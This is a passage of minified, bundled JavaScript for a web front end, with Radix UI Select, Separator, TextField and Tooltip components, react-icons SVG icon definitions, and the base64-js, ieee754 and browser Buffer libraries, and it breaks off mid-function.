    }, reactExports.createElement(Viewport, {
        asChild: !0,
        className: "rt-SelectViewport"
    }, reactExports.createElement(Viewport$1, {
        className: "rt-ScrollAreaViewport",
        style: {
            overflowY: void 0
        }
    }, x)), reactExports.createElement(Scrollbar, {
        className: "rt-ScrollAreaScrollbar rt-r-size-1",
        orientation: "vertical"
    }, reactExports.createElement(Thumb, {
        className: "rt-ScrollAreaThumb"
    }))))))
}
);
g.displayName = "Select.Content";
const v = reactExports.forwardRef( (_, M) => {
    const {className: j, children: O, ...x} = _;
    return reactExports.createElement(Item, {
        ...x,
        asChild: !1,
        ref: M,
        className: y$2("rt-SelectItem", j)
    }, reactExports.createElement(ItemIndicator, {
        className: "rt-SelectItemIndicator"
    }, reactExports.createElement(t$3, {
        className: "rt-SelectItemIndicatorIcon"
    })), reactExports.createElement(ItemText, null, O))
}
);
v.displayName = "Select.Item";
const y = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Group, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-SelectGroup", _)
}));
y.displayName = "Select.Group";
const h = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Label, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-SelectLabel", _)
}));
h.displayName = "Select.Label";
const I = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Separator, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-SelectSeparator", _)
}));
I.displayName = "Select.Separator";
const e$2 = ["horizontal", "vertical"]
  , r$1 = ["1", "2", "3", "4"]
  , t$1 = {
    orientation: {
        type: "enum",
        className: "rt-r-orientation",
        values: e$2,
        default: "horizontal",
        responsive: !0
    },
    size: {
        type: "enum",
        className: "rt-r-size",
        values: r$1,
        default: "1",
        responsive: !0
    },
    color: {
        ...r$e.color,
        default: "gray"
    },
    decorative: {
        type: "boolean",
        default: !0
    }
}
  , o = reactExports.forwardRef( (_, M) => {
    const {className: j, color: O, decorative: x, ...w} = v$2(_, t$1, r$b);
    return reactExports.createElement("span", {
        "data-accent-color": O,
        role: x ? void 0 : "separator",
        ...w,
        ref: M,
        className: y$2("rt-Separator", j)
    })
}
);
o.displayName = "Separator";
const r = ["1", "2", "3"]
  , t = ["classic", "surface", "soft"]
  , f = {
    size: {
        type: "enum",
        className: "rt-r-size",
        values: r,
        default: "2",
        responsive: !0
    },
    variant: {
        type: "enum",
        className: "rt-variant",
        values: t,
        default: "surface"
    },
    ...r$e,
    ...r$9
}
  , a = ["left", "right"]
  , i$1 = {
    side: {
        type: "enum",
        values: a
    },
    ...r$e,
    gap: u$2.gap,
    px: p$7.px,
    pl: p$7.pl,
    pr: p$7.pr
}
  , u = reactExports.forwardRef( (_, M) => {
    const j = reactExports.useRef(null)
      , {children: O, className: x, color: w, radius: b, style: X, ...Y} = v$2(_, f, r$b);
    return reactExports.createElement("div", {
        "data-accent-color": w,
        "data-radius": b,
        style: X,
        className: y$2("rt-TextFieldRoot", x),
        onPointerDown: F => {
            const V = F.target;
            if (V.closest("input, button, a"))
                return;
            const K = j.current;
            if (!K)
                return;
            const Q = V.closest(`
            .rt-TextFieldSlot[data-side='right'],
            .rt-TextFieldSlot:not([data-side='right']) ~ .rt-TextFieldSlot:not([data-side='left'])
          `) ? K.value.length : 0;
            requestAnimationFrame( () => {
                try {
                    K.setSelectionRange(Q, Q)
                } catch {}
                K.focus()
            }
            )
        }
    }, reactExports.createElement("input", {
        spellCheck: "false",
        ...Y,
        ref: composeRefs(j, M),
        className: "rt-reset rt-TextFieldInput"
    }), O)
}
);
u.displayName = "TextField.Root";
const c = reactExports.forwardRef( (_, M) => {
    const {className: j, color: O, side: x, ...w} = v$2(_, i$1);
    return reactExports.createElement("div", {
        "data-accent-color": O,
        "data-side": x,
        ...w,
        ref: M,
        className: y$2("rt-TextFieldSlot", j)
    })
}
);
c.displayName = "TextField.Slot";
const e$1 = {
    content: {
        type: "ReactNode",
        required: !0
    },
    width: t$8.width,
    minWidth: t$8.minWidth,
    maxWidth: {
        ...t$8.maxWidth,
        default: "360px"
    }
}
  , e = reactExports.forwardRef( (_, M) => {
    const {children: j, className: O, open: x, defaultOpen: w, onOpenChange: b, delayDuration: X, disableHoverableContent: Y, content: F, container: V, forceMount: K, ...Q} = v$2(_, e$1)
      , ee = {
        open: x,
        defaultOpen: w,
        onOpenChange: b,
        delayDuration: X,
        disableHoverableContent: Y
    };
    return reactExports.createElement(Root3, {
        ...ee
    }, reactExports.createElement(Trigger, {
        asChild: !0
    }, j), reactExports.createElement(Portal, {
        container: V,
        forceMount: K
    }, reactExports.createElement(R$1, {
        asChild: !0
    }, reactExports.createElement(Content2, {
        sideOffset: 4,
        collisionPadding: 10,
        ...Q,
        asChild: !1,
        ref: M,
        className: y$2("rt-TooltipContent", O)
    }, reactExports.createElement(p$8, {
        as: "p",
        className: "rt-TooltipText",
        size: "1"
    }, F), reactExports.createElement(Arrow2, {
        className: "rt-TooltipArrow"
    })))))
}
);
e.displayName = "Tooltip";
var DefaultContext = {
    color: void 0,
    size: void 0,
    className: void 0,
    style: void 0,
    attr: void 0
}
  , IconContext = React.createContext && React.createContext(DefaultContext)
  , _excluded = ["attr", "size", "title"];
function _objectWithoutProperties(_, M) {
    if (_ == null)
        return {};
    var j = _objectWithoutPropertiesLoose(_, M), O, x;
    if (Object.getOwnPropertySymbols) {
        var w = Object.getOwnPropertySymbols(_);
        for (x = 0; x < w.length; x++)
            O = w[x],
            !(M.indexOf(O) >= 0) && Object.prototype.propertyIsEnumerable.call(_, O) && (j[O] = _[O])
    }
    return j
}
function _objectWithoutPropertiesLoose(_, M) {
    if (_ == null)
        return {};
    var j = {};
    for (var O in _)
        if (Object.prototype.hasOwnProperty.call(_, O)) {
            if (M.indexOf(O) >= 0)
                continue;
            j[O] = _[O]
        }
    return j
}
function _extends() {
    return _extends = Object.assign ? Object.assign.bind() : function(_) {
        for (var M = 1; M < arguments.length; M++) {
            var j = arguments[M];
            for (var O in j)
                Object.prototype.hasOwnProperty.call(j, O) && (_[O] = j[O])
        }
        return _
    }
    ,
    _extends.apply(this, arguments)
}
function ownKeys(_, M) {
    var j = Object.keys(_);
    if (Object.getOwnPropertySymbols) {
        var O = Object.getOwnPropertySymbols(_);
        M && (O = O.filter(function(x) {
            return Object.getOwnPropertyDescriptor(_, x).enumerable
        })),
        j.push.apply(j, O)
    }
    return j
}
function _objectSpread(_) {
    for (var M = 1; M < arguments.length; M++) {
        var j = arguments[M] != null ? arguments[M] : {};
        M % 2 ? ownKeys(Object(j), !0).forEach(function(O) {
            _defineProperty$1(_, O, j[O])
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(_, Object.getOwnPropertyDescriptors(j)) : ownKeys(Object(j)).forEach(function(O) {
            Object.defineProperty(_, O, Object.getOwnPropertyDescriptor(j, O))
        })
    }
    return _
}
function _defineProperty$1(_, M, j) {
    return M = _toPropertyKey(M),
    M in _ ? Object.defineProperty(_, M, {
        value: j,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : _[M] = j,
    _
}
function _toPropertyKey(_) {
    var M = _toPrimitive(_, "string");
    return typeof M == "symbol" ? M : M + ""
}
function _toPrimitive(_, M) {
    if (typeof _ != "object" || !_)
        return _;
    var j = _[Symbol.toPrimitive];
    if (j !== void 0) {
        var O = j.call(_, M);
        if (typeof O != "object")
            return O;
        throw new TypeError("@@toPrimitive must return a primitive value.")
    }
    return (M === "string" ? String : Number)(_)
}
function Tree2Element(_) {
    return _ && _.map( (M, j) => React.createElement(M.tag, _objectSpread({
        key: j
    }, M.attr), Tree2Element(M.child)))
}
function GenIcon(_) {
    return M => React.createElement(IconBase, _extends({
        attr: _objectSpread({}, _.attr)
    }, M), Tree2Element(_.child))
}
function IconBase(_) {
    var M = j => {
        var {attr: O, size: x, title: w} = _, b = _objectWithoutProperties(_, _excluded), X = x || j.size || "1em", Y;
        return j.className && (Y = j.className),
        _.className && (Y = (Y ? Y + " " : "") + _.className),
        React.createElement("svg", _extends({
            stroke: "currentColor",
            fill: "currentColor",
            strokeWidth: "0"
        }, j.attr, O, b, {
            className: Y,
            style: _objectSpread(_objectSpread({
                color: _.color || j.color
            }, j.style), _.style),
            height: X,
            width: X,
            xmlns: "http://www.w3.org/2000/svg"
        }), w && React.createElement("title", null, w), _.children)
    }
    ;
    return IconContext !== void 0 ? React.createElement(IconContext.Consumer, null, j => M(j)) : M(DefaultContext)
}
function FaCheckCircle(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"
            },
            child: []
        }]
    })(_)
}
function FaEye(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 576 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M572.52 241.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400a144 144 0 1 1 144-144 143.93 143.93 0 0 1-144 144zm0-240a95.31 95.31 0 0 0-25.31 3.79 47.85 47.85 0 0 1-66.9 66.9A95.78 95.78 0 1 0 288 160z"
            },
            child: []
        }]
    })(_)
}
function FaLockOpen(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 576 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M423.5 0C339.5.3 272 69.5 272 153.5V224H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48h-48v-71.1c0-39.6 31.7-72.5 71.3-72.9 40-.4 72.7 32.1 72.7 72v80c0 13.3 10.7 24 24 24h32c13.3 0 24-10.7 24-24v-80C576 68 507.5-.3 423.5 0z"
            },
            child: []
        }]
    })(_)
}
function FaLock(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 448 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"
            },
            child: []
        }]
    })(_)
}
function FaRegTimesCircle(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm101.8-262.2L295.6 256l62.2 62.2c4.7 4.7 4.7 12.3 0 17l-22.6 22.6c-4.7 4.7-12.3 4.7-17 0L256 295.6l-62.2 62.2c-4.7 4.7-12.3 4.7-17 0l-22.6-22.6c-4.7-4.7-4.7-12.3 0-17l62.2-62.2-62.2-62.2c-4.7-4.7-4.7-12.3 0-17l22.6-22.6c4.7-4.7 12.3-4.7 17 0l62.2 62.2 62.2-62.2c4.7-4.7 12.3-4.7 17 0l22.6 22.6c4.7 4.7 4.7 12.3 0 17z"
            },
            child: []
        }]
    })(_)
}
var buffer$1 = {}
  , base64Js = {};
base64Js.byteLength = byteLength;
base64Js.toByteArray = toByteArray;
base64Js.fromByteArray = fromByteArray;
var lookup = []
  , revLookup = []
  , Arr = typeof Uint8Array < "u" ? Uint8Array : Array
  , code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
for (var i = 0, len = code.length; i < len; ++i)
    lookup[i] = code[i],
    revLookup[code.charCodeAt(i)] = i;
revLookup[45] = 62;
revLookup[95] = 63;
function getLens(_) {
    var M = _.length;
    if (M % 4 > 0)
        throw new Error("Invalid string. Length must be a multiple of 4");
    var j = _.indexOf("=");
    j === -1 && (j = M);
    var O = j === M ? 0 : 4 - j % 4;
    return [j, O]
}
function byteLength(_) {
    var M = getLens(_)
      , j = M[0]
      , O = M[1];
    return (j + O) * 3 / 4 - O
}
function _byteLength(_, M, j) {
    return (M + j) * 3 / 4 - j
}
function toByteArray(_) {
    var M, j = getLens(_), O = j[0], x = j[1], w = new Arr(_byteLength(_, O, x)), b = 0, X = x > 0 ? O - 4 : O, Y;
    for (Y = 0; Y < X; Y += 4)
        M = revLookup[_.charCodeAt(Y)] << 18 | revLookup[_.charCodeAt(Y + 1)] << 12 | revLookup[_.charCodeAt(Y + 2)] << 6 | revLookup[_.charCodeAt(Y + 3)],
        w[b++] = M >> 16 & 255,
        w[b++] = M >> 8 & 255,
        w[b++] = M & 255;
    return x === 2 && (M = revLookup[_.charCodeAt(Y)] << 2 | revLookup[_.charCodeAt(Y + 1)] >> 4,
    w[b++] = M & 255),
    x === 1 && (M = revLookup[_.charCodeAt(Y)] << 10 | revLookup[_.charCodeAt(Y + 1)] << 4 | revLookup[_.charCodeAt(Y + 2)] >> 2,
    w[b++] = M >> 8 & 255,
    w[b++] = M & 255),
    w
}
function tripletToBase64(_) {
    return lookup[_ >> 18 & 63] + lookup[_ >> 12 & 63] + lookup[_ >> 6 & 63] + lookup[_ & 63]
}
function encodeChunk(_, M, j) {
    for (var O, x = [], w = M; w < j; w += 3)
        O = (_[w] << 16 & 16711680) + (_[w + 1] << 8 & 65280) + (_[w + 2] & 255),
        x.push(tripletToBase64(O));
    return x.join("")
}
function fromByteArray(_) {
    for (var M, j = _.length, O = j % 3, x = [], w = 16383, b = 0, X = j - O; b < X; b += w)
        x.push(encodeChunk(_, b, b + w > X ? X : b + w));
    return O === 1 ? (M = _[j - 1],
    x.push(lookup[M >> 2] + lookup[M << 4 & 63] + "==")) : O === 2 && (M = (_[j - 2] << 8) + _[j - 1],
    x.push(lookup[M >> 10] + lookup[M >> 4 & 63] + lookup[M << 2 & 63] + "=")),
    x.join("")
}
var ieee754 = {};
/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */
ieee754.read = function(_, M, j, O, x) {
    var w, b, X = x * 8 - O - 1, Y = (1 << X) - 1, F = Y >> 1, V = -7, K = j ? x - 1 : 0, Q = j ? -1 : 1, ee = _[M + K];
    for (K += Q,
    w = ee & (1 << -V) - 1,
    ee >>= -V,
    V += X; V > 0; w = w * 256 + _[M + K],
    K += Q,
    V -= 8)
        ;
    for (b = w & (1 << -V) - 1,
    w >>= -V,
    V += O; V > 0; b = b * 256 + _[M + K],
    K += Q,
    V -= 8)
        ;
    if (w === 0)
        w = 1 - F;
    else {
        if (w === Y)
            return b ? NaN : (ee ? -1 : 1) * (1 / 0);
        b = b + Math.pow(2, O),
        w = w - F
    }
    return (ee ? -1 : 1) * b * Math.pow(2, w - O)
}
;
ieee754.write = function(_, M, j, O, x, w) {
    var b, X, Y, F = w * 8 - x - 1, V = (1 << F) - 1, K = V >> 1, Q = x === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0, ee = O ? 0 : w - 1, ae = O ? 1 : -1, ne = M < 0 || M === 0 && 1 / M < 0 ? 1 : 0;
    for (M = Math.abs(M),
    isNaN(M) || M === 1 / 0 ? (X = isNaN(M) ? 1 : 0,
    b = V) : (b = Math.floor(Math.log(M) / Math.LN2),
    M * (Y = Math.pow(2, -b)) < 1 && (b--,
    Y *= 2),
    b + K >= 1 ? M += Q / Y : M += Q * Math.pow(2, 1 - K),
    M * Y >= 2 && (b++,
    Y /= 2),
    b + K >= V ? (X = 0,
    b = V) : b + K >= 1 ? (X = (M * Y - 1) * Math.pow(2, x),
    b = b + K) : (X = M * Math.pow(2, K - 1) * Math.pow(2, x),
    b = 0)); x >= 8; _[j + ee] = X & 255,
    ee += ae,
    X /= 256,
    x -= 8)
        ;
    for (b = b << x | X,
    F += x; F > 0; _[j + ee] = b & 255,
    ee += ae,
    b /= 256,
    F -= 8)
        ;
    _[j + ee - ae] |= ne * 128
}
;
/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
(function(_) {
    const M = base64Js
      , j = ieee754
      , O = typeof Symbol == "function" && typeof Symbol.for == "function" ? Symbol.for("nodejs.util.inspect.custom") : null;
    _.Buffer = V,
    _.SlowBuffer = ye,
    _.INSPECT_MAX_BYTES = 50;
    const x = 2147483647;
    _.kMaxLength = x;
    const {Uint8Array: w, ArrayBuffer: b, SharedArrayBuffer: X} = globalThis;
    V.TYPED_ARRAY_SUPPORT = Y(),
    !V.TYPED_ARRAY_SUPPORT && typeof console < "u" && typeof console.error == "function" && console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");
    function Y() {
        try {
            const ke = new w(1)
              , Me = {
                foo: function() {
                    return 42
                }
            };
            return Object.setPrototypeOf(Me, w.prototype),
            Object.setPrototypeOf(ke, Me),
            ke.foo() === 42
        } catch {
            return !1
        }
    }
    Object.defineProperty(V.prototype, "parent", {
        enumerable: !0,
        get: function() {
            if (V.isBuffer(this))
                return this.buffer
        }
    }),
    Object.defineProperty(V.prototype, "offset", {
        enumerable: !0,
        get: function() {
            if (V.isBuffer(this))
                return this.byteOffset
        }
    });
    function F(ke) {
        if (ke > x)
            throw new RangeError('The value "' + ke + '" is invalid for option "size"');
        const Me = new w(ke);
        return Object.setPrototypeOf(Me, V.prototype),
        Me
    }
    function V(ke, Me, Ue) {
        if (typeof ke == "number") {
            if (typeof Me == "string")
                throw new TypeError('The "string" argument must be of type string. Received type number');
            return ae(ke)
        }
        return K(ke, Me, Ue)
    }
    V.poolSize = 8192;
    function K(ke, Me, Ue) {
        if (typeof ke == "string")
            return ne(ke, Me);
        if (b.isView(ke))
            return ue(ke);
        if (ke == null)
            throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof ke);
        if (Ce(ke, b) || ke && Ce(ke.buffer, b) || typeof X < "u" && (Ce(ke, X) || ke && Ce(ke.buffer, X)))
            return fe(ke, Me, Ue);
        if (typeof ke == "number")
            throw new TypeError('The "value" argument must not be of type number. Received type number');
        const rt = ke.valueOf && ke.valueOf();
        if (rt != null && rt !== ke)
            return V.from(rt, Me, Ue);
        const dt = he(ke);
        if (dt)
            return dt;
        if (typeof Symbol < "u" && Symbol.toPrimitive != null && typeof ke[Symbol.toPrimitive] == "function")
            return V.from(ke[Symbol.toPrimitive]("string"), Me, Ue);
        throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof ke)
    }
    V.from = function(ke, Me, Ue) {
        return K(ke, Me, Ue)
    }
    ,
    Object.setPrototypeOf(V.prototype, w.prototype),
    Object.setPrototypeOf(V, w);
    function Q(ke) {
        if (typeof ke != "number")
            throw new TypeError('"size" argument must be of type number');
        if (ke < 0)
            throw new RangeError('The value "' + ke + '" is invalid for option "size"')
    }
    function ee(ke, Me, Ue) {
        return Q(ke),
        ke <= 0 ? F(ke) : Me !== void 0 ? typeof Ue == "string" ? F(ke).fill(Me, Ue) : F(ke).fill(Me) : F(ke)
    }
    V.alloc = function(ke, Me, Ue) {
        return ee(ke, Me, Ue)
    }
    ;
    function ae(ke) {
        return Q(ke),
        F(ke < 0 ? 0 : pe(ke) | 0)
    }
    V.allocUnsafe = function(ke) {
        return ae(ke)
    }
    ,
    V.allocUnsafeSlow = function(ke) {
        return ae(ke)
    }
    ;
    function ne(ke, Me) {
        if ((typeof Me != "string" || Me === "") && (Me = "utf8"),
        !V.isEncoding(Me))
            throw new TypeError("Unknown encoding: " + Me);
        const Ue = be(ke, Me) | 0;
        let rt = F(Ue);
        const dt = rt.write(ke, Me);
        return dt !== Ue && (rt = rt.slice(0, dt)),
        rt
    }
    function oe(ke) {
        const Me = ke.length < 0 ? 0 : pe(ke.length) | 0
          , Ue = F(Me);
        for (let rt = 0; rt < Me; rt += 1)
            Ue[rt] = ke[rt] & 255;
        return Ue
    }
    function ue(ke) {
        if (Ce(ke, w)) {
            const Me = new w(ke);
            return fe(Me.buffer, Me.byteOffset, Me.byteLength)
        }
        return oe(ke)
    }
    function fe(ke, Me, Ue) {
        if (Me < 0 || ke.byteLength < Me)
            throw new RangeError('"offset" is outside of buffer bounds');
        if (ke.byteLength < Me + (Ue || 0))
            throw new RangeError('"length" is outside of buffer bounds');
        let rt;
        return Me === void 0 && Ue === void 0 ? rt = new w(ke) : Ue === void 0 ? rt = new w(ke,Me) : rt = new w(ke,Me,Ue),
        Object.setPrototypeOf(rt, V.prototype),
        rt
    }
    function he(ke) {
        if (V.isBuffer(ke)) {
            const Me = pe(ke.length) | 0
              , Ue = F(Me);
            return Ue.length === 0 || ke.copy(Ue, 0, 0, Me),
            Ue
        }
        if (ke.length !== void 0)
            return typeof ke.length != "number" || st(ke.length) ? F(0) : oe(ke);
        if (ke.type === "Buffer" && Array.isArray(ke.data))
            return oe(ke.data)
    }
    function pe(ke) {
        if (ke >= x)
            throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + x.toString(16) + " bytes");
        return ke | 0
    }
    function ye(ke) {
        return +ke != ke && (ke = 0),
        V.alloc(+ke)
    }
    V.isBuffer = function(Me) {
        return Me != null && Me._isBuffer === !0 && Me !== V.prototype
    }
    ,
    V.compare = function(Me, Ue) {
        if (Ce(Me, w) && (Me = V.from(Me, Me.offset, Me.byteLength)),
        Ce(Ue, w) && (Ue = V.from(Ue, Ue.offset, Ue.byteLength)),
        !V.isBuffer(Me) || !V.isBuffer(Ue))
            throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
        if (Me === Ue)
            return 0;
        let rt = Me.length
          , dt = Ue.length;
        for (let Et = 0, ft = Math.min(rt, dt); Et < ft; ++Et)
            if (Me[Et] !== Ue[Et]) {
                rt = Me[Et],
                dt = Ue[Et];
                break
            }
        return rt < dt ? -1 : dt < rt ? 1 : 0
    }
    ,
    V.isEncoding = function(Me) {
        switch (String(Me).toLowerCase()) {
        case "hex":
        case "utf8":
        case "utf-8":
        case "ascii":
        case "latin1":
        case "binary":
        case "base64":
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
            return !0;
        default:
            return !1
        }
    }
    ,
    V.concat = function(Me, Ue) {
        if (!Array.isArray(Me))
            throw new TypeError('"list" argument must be an Array of Buffers');
        if (Me.length === 0)
            return V.alloc(0);
        let rt;
        if (Ue === void 0)
            for (Ue = 0,
            rt = 0; rt < Me.length; ++rt)
                Ue += Me[rt].length;
        const dt = V.allocUnsafe(Ue);
        let Et = 0;
        for (rt = 0; rt < Me.length; ++rt) {
            let ft = Me[rt];
            if (Ce(ft, w))
                Et + ft.length > dt.length ? (V.isBuffer(ft) || (ft = V.from(ft)),
                ft.copy(dt, Et)) : w.prototype.set.call(dt, ft, Et);
            else if (V.isBuffer(ft))
                ft.copy(dt, Et);
            else
                throw new TypeError('"list" argument must be an Array of Buffers');
            Et += ft.length
        }
        return dt
    }
    ;
    function be(ke, Me) {
        if (V.isBuffer(ke))
            return ke.length;
        if (b.isView(ke) || Ce(ke, b))
            return ke.byteLength;
        if (typeof ke != "string")
            throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof ke);
        const Ue = ke.length
          , rt = arguments.length > 2 && arguments[2] === !0;
        if (!rt && Ue === 0)
            return 0;
        let dt = !1;
        for (; ; )
            switch (Me) {
            case "ascii":
            case "latin1":
            case "binary":
                return Ue;
            case "utf8":
            case "utf-8":
                return mt(ke).length;
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
                return Ue * 2;
            case "hex":
                return Ue >>> 1;
            case "base64":
                return we(ke).length;
            default:
                if (dt)
                    return rt ? -1 : mt(ke).length;
                Me = ("" + Me).toLowerCase(),
                dt = !0
            }
    }
    V.byteLength = be;
    function xe(ke, Me, Ue) {
        let rt = !1;
        if ((Me === void 0 || Me < 0) && (Me = 0),
        Me > this.length || ((Ue === void 0 || Ue > this.length) && (Ue = this.length),
        Ue <= 0) || (Ue >>>= 0,
        Me >>>= 0,
        Ue <= Me))
            return "";
        for (ke || (ke = "utf8"); ; )
            switch (ke) {
            case "hex":
                return ve(this, Me, Ue);
            case "utf8":
            case "utf-8":
                return se(this, Me, Ue);
            case "ascii":
                return $(this, Me, Ue);
            case "latin1":
            case "binary":
                return ie(this, Me, Ue);
            case "base64":
                return te(this, Me, Ue);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
                return ge(this, Me, Ue);
            default:
                if (rt)
                    throw new TypeError("Unknown encoding: " + ke);
                ke = (ke + "").toLowerCase(),
                rt = !0
            }
    }
    V.prototype._isBuffer = !0;
    function Ae(ke, Me, Ue) {
        const rt = ke[Me];
        ke[Me] = ke[Ue],
        ke[Ue] = rt
    }
    V.prototype.swap16 = function() {
        const Me = this.length;
        if (Me % 2 !== 0)
            throw new RangeError("Buffer size must be a multiple of 16-bits");
        for (let Ue = 0; Ue < Me; Ue += 2)
            Ae(this, Ue, Ue + 1);
        return this
    }
    ,
    V.prototype.swap32 = function() {
        const Me = this.length;
        if (Me % 4 !== 0)
            throw new RangeError("Buffer size must be a multiple of 32-bits");
        for (let Ue = 0; Ue < Me; Ue += 4)
            Ae(this, Ue, Ue + 3),
            Ae(this, Ue + 1, Ue + 2);
        return this
    }
    ,
    V.prototype.swap64 = function() {
        const Me = this.length;
        if (Me % 8 !== 0)
            throw new RangeError("Buffer size must be a multiple of 64-bits");
        for (let Ue = 0; Ue < Me; Ue += 8)
            Ae(this, Ue, Ue + 7),
            Ae(this, Ue + 1, Ue + 6),
            Ae(this, Ue + 2, Ue + 5),
            Ae(this, Ue + 3, Ue + 4);
        return this
    }
    ,
    V.prototype.toString = function() {
        const Me = this.length;
        return Me === 0 ? "" : arguments.length === 0 ? se(this, 0, Me) : xe.apply(this, arguments)
    }
    ,
    V.prototype.toLocaleString = V.prototype.toString,
    V.prototype.equals = function(Me) {
        if (!V.isBuffer(Me))
            throw new TypeError("Argument must be a Buffer");
        return this === Me ? !0 : V.compare(this, Me) === 0
    }
    ,
    V.prototype.inspect = function() {
        let Me = "";
        const Ue = _.INSPECT_MAX_BYTES;
        return Me = this.toString("hex", 0, Ue).replace(/(.{2})/g, "$1 ").trim(),
        this.length > Ue && (Me += " ... "),
        "<Buffer " + Me + ">"
    }
    ,
    O && (V.prototype[O] = V.prototype.inspect),
    V.prototype.compare = function(Me, Ue, rt, dt, Et) {
        if (Ce(Me, w) && (Me = V.from(Me, Me.offset, Me.byteLength)),
        !V.isBuffer(Me))
            throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof Me);
        if (Ue === void 0 && (Ue = 0),
        rt === void 0 && (rt = Me ? Me.length : 0),
        dt === void 0 && (dt = 0),
        Et === void 0 && (Et = this.length),
        Ue < 0 || rt > Me.length || dt < 0 || Et > this.length)
            throw new RangeError("out of range index");
        if (dt >= Et && Ue >= rt)
            return 0;
        if (dt >= Et)
            return -1;
        if (Ue >= rt)
            return 1;
        if (Ue >>>= 0,
        rt >>>= 0,
        dt >>>= 0,
        Et >>>= 0,
        this === Me)
            return 0;
        let ft = Et - dt
          , gt = rt - Ue;
        const Yt = Math.min(ft, gt)
          , Ct = this.slice(dt, Et)
          , Ot = Me.slice(Ue, rt);
        for (let Vt = 0; Vt < Yt; ++Vt)
            if (Ct[Vt] !== Ot[Vt]) {
                ft = Ct[Vt],
                gt = Ot[Vt];
                break
            }
        return ft < gt ? -1 : gt < ft ? 1 : 0
    }
    ;
    function Ee(ke, Me, Ue, rt, dt) {
        if (ke.length === 0)
            return -1;
        if (typeof Ue == "string" ? (rt = Ue,
        Ue = 0) : Ue > 2147483647 ? Ue = 2147483647 : Ue < -2147483648 && (Ue = -2147483648),
        Ue = +Ue,
        st(Ue) && (Ue = dt ? 0 : ke.length - 1),
        Ue < 0 && (Ue = ke.length + Ue),
        Ue >= ke.length) {
            if (dt)
                return -1;
            Ue = ke.length - 1
        } else if (Ue < 0)
            if (dt)
                Ue = 0;
            else
                return -1;
        if (typeof Me == "string" && (Me = V.from(Me, rt)),
        V.isBuffer(Me))
            return Me.length === 0 ? -1 : Be(ke, Me, Ue, rt, dt);
        if (typeof Me == "number")
            return Me = Me & 255,
            typeof w.prototype.indexOf == "function" ? dt ? w.prototype.indexOf.call(ke, Me, Ue) : w.prototype.lastIndexOf.call(ke, Me, Ue) : Be(ke, [Me], Ue, rt, dt);
        throw new TypeError("val must be string, number or Buffer")
    }
    function Be(ke, Me, Ue, rt, dt) {
        let Et = 1
          , ft = ke.length
          , gt = Me.length;
        if (rt !== void 0 && (rt = String(rt).toLowerCase(),
        rt === "ucs2" || rt === "ucs-2" || rt === "utf16le" || rt === "utf-16le")) {
            if (ke.length < 2 || Me.length < 2)
                return -1;
            Et = 2,
            ft /= 2,
            gt /= 2,
            Ue /= 2
        }
        function Yt(Ot, Vt) {
            return Et === 1 ? Ot[Vt] : Ot.readUInt16BE(Vt * Et)
        }
        let Ct;
        if (dt) {
            let Ot = -1;
            for (Ct = Ue; Ct < ft; Ct++)
                if (Yt(ke, Ct) === Yt(Me, Ot === -1 ? 0 : Ct - Ot)) {
                    if (Ot === -1 && (Ot = Ct),
                    Ct - Ot + 1 === gt)
                        return Ot * Et
                } else
